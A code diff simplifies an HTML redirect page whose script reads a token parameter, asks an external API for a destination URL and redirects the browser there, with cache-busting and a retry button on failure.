@@ -4,6 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 强制禁用缓存 - 解决微信等浏览器缓存问题 -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
@@ -20,136 +21,95 @@
         }
         .loading {
             font-size: 18px;
-            margin: 30px 0 15px;
+            margin-top: 30px;
         }
-        .progress-bar {
-            width: 80%;
-            max-width: 200px;
-            height: 4px;
-            background: #eee;
-            margin: 0 auto;
-            border-radius: 2px;
-            overflow: hidden;
+        .loading:after {
+            content: '...';
+            animation: dots 1.5s steps(5, end) infinite;
         }
-        .progress {
-            height: 100%;
-            width: 0;
-            background: #3498db;
-            transition: width 0.3s;
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
         }
         .error {
             color: #e74c3c;
-            margin: 20px 0;
-            padding: 0 20px;
-            word-break: break-word;
+            margin-top: 20px;
         }
         .retry-btn {
             margin-top: 20px;
-            padding: 8px 20px;
+            padding: 10px 20px;
             background: #3498db;
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 14px;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
     <div id="content">
-        <div class="loading" id="loadingText">正在准备精彩内容</div>
-        <div class="progress-bar"><div class="progress" id="progress"></div></div>
+        <div class="loading">正在跳转，请稍候...</div>
     </div>
 
     <script>
-        // 兼容性处理
-        if (!window.Promise) {
-            document.getElementById('content').innerHTML = 
-                '<div class="error">您的浏览器版本过低，请升级后访问</div>';
-            throw new Error('Browser not supported');
-        }
-
-        // 工具函数
+        // 获取URL参数
         function getQueryParam(name) {
-            try {
-                var params = new URLSearchParams(window.location.search);
-                return params.get(name);
-            } catch (e) {
-                // 兼容旧版浏览器
-                var match = RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
-                return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
-            }
+            var params = new URLSearchParams(window.location.search);
+            return params.get(name);
         }
 
+        // 添加随机参数防止缓存
         function addCacheBuster(url) {
             return url + (url.indexOf('?') > -1 ? '&' : '?') + '_=' + Date.now();
         }
 
-        function updateProgress(percent) {
-            var progress = document.getElementById('progress');
-            if (progress) progress.style.width = percent + '%';
-            
-            var loadingText = document.getElementById('loadingText');
-            if (loadingText) loadingText.textContent = 
-                '正在加载' + (percent > 0 ? ' (' + percent + '%)' : '') + '...';
+        // 显示错误信息
+        function showError(message) {
+            document.getElementById('content').innerHTML = [
+                '<div class="error">' + message + '</div>',
+                '<button class="retry-btn" onclick="window.location.reload()">重新加载</button>'
+            ].join('');
         }
 
-        // 带超时的fetch
-        function fetchWithTimeout(url, options, timeout) {
-            return new Promise(function(resolve, reject) {
-                var timer = setTimeout(function() {
-                    reject(new Error('请求超时'));
-                }, timeout || 8000);
-                
-                fetch(url, options).then(
-                    function(response) {
-                        clearTimeout(timer);
-                        resolve(response);
-                    },
-                    function(err) {
-                        clearTimeout(timer);
-                        reject(err);
-                    }
-                );
-            });
-        }
-
-        // 主逻辑
-        function startRedirect() {
+        // 主跳转函数
+        function performRedirect() {
+            // 获取token参数，默认为1
             var token = getQueryParam('token') || '1';
+            
+            // 构建API请求URL
             var apiUrl = addCacheBuster('https://hi9.top/qs_github/api.php?token=' + token);
             
-            updateProgress(10);
-            
-            fetchWithTimeout(apiUrl, {
+            // 使用fetch获取跳转链接
+            fetch(apiUrl, {
                 method: 'GET',
                 mode: 'cors',
                 cache: 'no-store',
                 credentials: 'omit'
-            }, 5000).then(function(response) {
-                updateProgress(50);
-                if (!response.ok) throw new Error('网络错误: ' + response.status);
+            })
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('网络响应不正常，状态码: ' + response.status);
+                }
                 return response.json();
-            }).then(function(data) {
-                updateProgress(80);
-                if (!data || !data.url) throw new Error('无效的跳转链接');
-                window.location.replace(addCacheBuster(data.url));
-            }).catch(function(error) {
-                console.error('RedirectError:', {
-                    message: error.message,
-                    token: token,
-                    ua: navigator.userAgent,
-                    time: new Date().toISOString()
-                });
+            })
+            .then(function(data) {
+                if (!data || !data.url) {
+                    throw new Error('服务器返回无效数据');
+                }
                 
-                document.getElementById('content').innerHTML = [
-                    '<div class="error">加载失败: ' + error.message + '</div>',
-                    '<button class="retry-btn" onclick="window.location.reload()">重新加载</button>'
-                ].join('');
+                // 跳转到目标URL，并添加缓存破坏参数
+                window.location.replace(addCacheBuster(data.url));
+            })
+            .catch(function(error) {
+                console.error('跳转失败:', error);
+                showError('跳转失败: ' + error.message);
             });
         }
 
-        // 启动
-        document.addEventListener('DOMContentLoaded', startRedirect);
+        // 使用window.onload确保页面完全加载后执行跳转
+        window.onload = performRedirect;
     </script>
 </body>
 </html>
